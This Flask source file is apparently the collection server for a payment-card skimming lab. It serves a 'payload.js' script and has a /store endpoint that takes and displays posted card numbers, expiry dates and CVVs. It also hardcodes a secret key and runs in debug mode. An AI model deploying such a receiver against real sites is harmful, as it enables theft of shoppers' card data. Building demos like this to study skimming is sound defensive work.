from flask import Flask, render_template, url_for, request, redirect
from flask_cors import CORS

app = Flask(__name__)
app.config['SECRET_KEY'] = 'nospecialword'
app.jinja_env.globals.update(min=min)
CORS(app, origins=[
  'http://localhost:5000',
  'http://127.0.0.1:5000'
])

cards = [
    {
        'number': '4111111111111111',
        'expiry': '12/25',
        'cvv': '123'
    }
    ]

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/payload')
def payload():
    return redirect(url_for('static', filename='payload.js'))

@app.route('/store', methods=['GET', 'POST'])
def store():
    if request.method == 'POST':
        card = request.get_json()
        print("DEBUG::::: ", card)
        cards.append(card)
    return render_template('store.html', cards=cards)

if __name__ == '__main__':
    app.run(debug=True, port=8888)